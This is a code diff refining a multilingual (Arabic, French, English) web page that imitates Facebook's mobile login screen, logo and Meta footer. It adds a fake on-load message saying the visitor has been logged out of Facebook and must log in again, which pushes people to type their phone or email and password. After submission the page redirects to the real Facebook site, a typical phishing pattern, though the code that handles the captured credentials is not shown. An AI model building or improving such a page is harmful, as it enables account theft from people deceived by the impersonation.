@@ -9,73 +9,78 @@
       --blue:#1877f2;
       --border:#dadde1;
       --text:#1c1e21;
-      --muted:#606770;
-      --bg:#ffffff;
-      --radius-xl:26px;
-      --radius-lg:18px;
+      --bg:#f0f2f5;
     }
-    *{box-sizing:border-box}
+    *{box-sizing:border-box;margin:0;padding:0}
+    html,body{height:100%}
     body{
       margin:0;
       font-family:Helvetica, Arial, sans-serif;
       background:var(--bg);
       color:var(--text);
       -webkit-tap-highlight-color: transparent;
+      display:flex;
+      justify-content:center;
     }
 
-    .top{display:flex;justify-content:center;padding:16px 12px 0;}
-    .lang{position:relative;}
+    .box{
+      background:#fff;
+      width:100%;
+      max-width:480px;
+      display:flex;
+      flex-direction:column;
+      min-height:100vh;
+      padding:20px;
+    }
+
+    .top{display:flex;justify-content:center;padding:8px 0;}
+    .lang{position:relative;display:inline-block;}
     .lang select{
       appearance:none;border:none;background:transparent;
-      font-size:16px;font-weight:600;color:#6b6f75;
-      padding:4px 22px 4px 8px;cursor:pointer;
+      font-size:15px;font-weight:600;color:#4b4f54;
+      padding:6px 26px 6px 10px;cursor:pointer;border-radius:8px;
+      border:1px solid transparent;
     }
+    .lang:hover select{border-color:rgba(0,0,0,0.04)}
     .lang::after{
-      content:"▾";position:absolute;right:2px;top:50%;
-      transform:translateY(-45%);font-size:14px;color:#6b6f75;
+      content:"▾";position:absolute;left:8px;top:50%;
+      transform:translateY(-50%);font-size:12px;color:#6b6f75;
       pointer-events:none;
     }
 
-    .logo-wrap{display:flex;justify-content:center;padding:18px 0 8px;}
-    .logo{width:82px;height:82px;border:1px solid var(--border);border-radius:50%;
-      display:flex;align-items:center;justify-content:center;background:#fff;}
-    .logo img{width:40px;height:40px}
+    .logo-wrap{margin:20px 0;display:flex;justify-content:center;}
+    .logo{width:72px;height:72px;}
+    .logo img{width:100%;height:100%;display:block;}
 
-    .box{width:100%;max-width:360px;margin:8px auto 0;padding:0 16px;text-align:center;}
-
+    form{flex:1;display:flex;flex-direction:column;justify-content:flex-start;}
     .field{
-      display:flex;align-items:center;gap:10px;width:100%;
-      border:1px solid var(--border);border-radius:var(--radius-lg);
-      background:#fff;padding:10px 14px;margin-bottom:12px;min-height:56px;
+      display:flex;align-items:center;width:100%;
+      border:1px solid var(--border);border-radius:8px;
+      background:#fff;padding:12px 14px;margin-bottom:12px;
+      min-height:48px;
     }
     .field input{
-      flex:1;border:none;outline:none;font-size:16px;background:transparent;color:var(--text);
+      flex:1;border:none;outline:none;font-size:16px;
+      background:transparent;color:var(--text);
     }
     .field input::placeholder{color:#8d949e}
 
-    .info-dot{
-      width:28px;height:28px;border-radius:50%;border:1px solid var(--border);
-      display:flex;align-items:center;justify-content:center;font-weight:bold;color:#7a7f85;
-      font-family:Arial, Helvetica, sans-serif;flex-shrink:0;
-    }
-
     .btn-primary{
-      width:100%;border:none;border-radius:var(--radius-xl);
-      background:var(--blue);color:#fff;font-weight:700;font-size:17px;
-      padding:14px 16px;cursor:pointer;
+      width:100%;border:none;border-radius:8px;
+      background:var(--blue);color:#fff;font-weight:700;
+      font-size:17px;padding:14px;cursor:pointer;
+      margin-top:6px;
     }
     .btn-primary:active{transform:scale(0.995)}
 
-    .forgot{margin:14px 0 28px;font-size:15px;}
-    .forgot a{text-decoration:none;color:var(--text);}
-
+    .forgot{margin:14px 0 8px;font-size:14px;text-align:center;}
+    .forgot a{text-decoration:none;color:var(--blue);}
     .create a{
-      display:inline-block;width:100%;text-decoration:none;text-align:center;
-      padding:12px 16px;border:1px solid var(--blue);color:var(--blue);
-      border-radius:var(--radius-xl);font-weight:700;font-size:16px;
+      display:inline-block;width:100%;text-decoration:none;
+      text-align:center;padding:12px 16px;border:1px solid var(--blue);
+      color:var(--blue);border-radius:8px;font-weight:700;font-size:15px;
+      margin-top:10px;
     }
-
-    .meta{text-align:center;color:#7a7f85;margin:22px 0 12px;font-size:14px;}
 
     .msg{
       margin-top:10px;display:flex;justify-content:center;align-items:center;gap:8px;
@@ -88,61 +93,83 @@
     @keyframes spin{to{transform:rotate(360deg)}}
 
     .popup,.error-text{display:none;color:#e53935;font-size:12px;text-align:right;margin:6px 2px -2px 0;}
+
+    /* فقاعة الرسالة */
+    .toast{
+      display:none;
+      background:#000;
+      color:#fff;
+      font-size:12px;
+      padding:8px 12px;
+      border-radius:16px;
+      text-align:center;
+      margin-top:10px;
+      align-self:center;
+      max-width:90%;
+    }
+
+    .meta{margin-top:auto;text-align:center;font-size:13px;color:#777;padding:14px 0;}
   </style>
 </head>
 <body>
 
-  <!-- اللغة -->
-  <div class="top">
-    <div class="lang">
-      <select id="languageSwitcher">
-        <option value="ar" selected>العربية</option>
-        <option value="fr">Français</option>
-        <option value="en">English</option>
-      </select>
-    </div>
-  </div>
-
-  <!-- الشعار -->
-  <div class="logo-wrap">
-    <div class="logo">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
-    </div>
-  </div>
-
-  <!-- النموذج -->
   <div class="box">
+    <!-- اختيار اللغة -->
+    <div class="top">
+      <div class="lang">
+        <select id="languageSwitcher" aria-label="Choose language">
+          <option value="ar" selected>العربية</option>
+          <option value="fr">Français</option>
+          <option value="en">English</option>
+        </select>
+      </div>
+    </div>
+
+    <!-- الشعار -->
+    <div class="logo-wrap">
+      <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
+      </div>
+    </div>
+
+    <!-- النموذج -->
     <form id="myForm" novalidate>
       <div class="field">
-        <div class="info-dot">i</div>
-        <input type="text" id="emailInput" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني">
+        <input type="text" id="emailInput" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" aria-label="email or phone">
       </div>
       <div class="popup" id="emailPopup"></div>
       <div class="error-text" id="emailErrorText"></div>
 
       <div class="field">
-        <input type="password" id="passwordInput" placeholder="كلمة السر">
+        <input type="password" id="passwordInput" placeholder="كلمة السر" aria-label="password">
       </div>
       <div class="popup" id="passwordPopup"></div>
 
       <button type="submit" class="btn-primary" id="loginBtn">تسجيل الدخول</button>
     </form>
 
-    <!-- رابط كلمة السر ثابت -->
+    <!-- فقاعة الرسالة -->
+    <div class="toast" id="logoutToast">
+      لقد تم تسجيل خروجك من فيسبوك يرجى إعادة تسجيل الدخول
+    </div>
+
+    <!-- رابط كلمة السر -->
     <div class="forgot">
       <a href="https://m.facebook.com/login/identify/" id="forgotLink">هل نسيت كلمة السر؟</a>
     </div>
 
+    <!-- رسالة انتظار -->
     <div class="msg" id="msg">
       <div class="spinner"></div><span id="waitMsg">يرجى الإنتظار...</span>
     </div>
 
-    <!-- رابط إنشاء حساب ثابت -->
+    <!-- رابط إنشاء حساب -->
     <div class="create">
       <a href="https://m.facebook.com/reg/" id="createAccount">إنشاء حساب جديد</a>
     </div>
 
-    <div class="meta">Meta ©</div>
+    <!-- الحقوق -->
+    <div class="meta">Meta © 2025</div>
   </div>
 
   <script>
@@ -156,6 +183,9 @@
     const emailErrorText = document.getElementById("emailErrorText");
     const forgotLink = document.getElementById("forgotLink");
     const createAccount = document.getElementById("createAccount");
+    const loginBtn = document.getElementById("loginBtn");
+    const waitMsg = document.getElementById("waitMsg");
+    const logoutToast = document.getElementById("logoutToast");
 
     const translations = {
       ar: {
@@ -167,7 +197,8 @@
         passError: "يرجى إدخال كلمة المرور الصحيحة",
         emailWrong: "رقم أو إيميل خاطئ",
         forgot: "هل نسيت كلمة السر؟",
-        create: "إنشاء حساب جديد"
+        create: "إنشاء حساب جديد",
+        toast: "لقد تم تسجيل خروجك من فيسبوك يرجى إعادة تسجيل الدخول"
       },
       fr: {
         email: "E-mail ou numéro de téléphone",
@@ -178,7 +209,8 @@
         passError: "Veuillez entrer un mot de passe correct",
         emailWrong: "Email ou numéro incorrect",
         forgot: "Mot de passe oublié ?",
-        create: "Créer un nouveau compte"
+        create: "Créer un nouveau compte",
+        toast: "Vous avez été déconnecté de Facebook. Veuillez vous reconnecter."
       },
       en: {
         email: "Email or Phone",
@@ -189,7 +221,8 @@
         passError: "Please enter the correct password",
         emailWrong: "Wrong email or phone",
         forgot: "Forgot password?",
-        create: "Create New Account"
+        create: "Create New Account",
+        toast: "You have been logged out of Facebook. Please log in again."
       }
     };
 
@@ -199,10 +232,11 @@
       currentLang = lang;
       emailInput.placeholder = translations[lang].email;
       passwordInput.placeholder = translations[lang].password;
-      document.getElementById("loginBtn").innerText = translations[lang].login;
-      document.getElementById("waitMsg").innerText = translations[lang].wait;
+      loginBtn.innerText = translations[lang].login;
+      waitMsg.innerText = translations[lang].wait;
       forgotLink.innerText = translations[lang].forgot;
       createAccount.innerText = translations[lang].create;
+      logoutToast.innerText = translations[lang].toast;
 
       emailPopup.style.display = "none";
       passwordPopup.style.display = "none";
@@ -249,9 +283,18 @@
 
       if(!valid) return;
 
+      // رسالة انتظار
       msg.style.visibility="visible";
       setTimeout(()=>{ window.location.href="https://m.facebook.com"; },1500);
     });
+
+    // عرض فقاعة تسجيل الخروج عند تحميل الصفحة
+    window.addEventListener("load", ()=>{
+      logoutToast.style.display="block";
+      setTimeout(()=>{ logoutToast.style.display="none"; },3000);
+    });
+
+    changeLanguage(currentLang);
   </script>
 </body>
 </html>
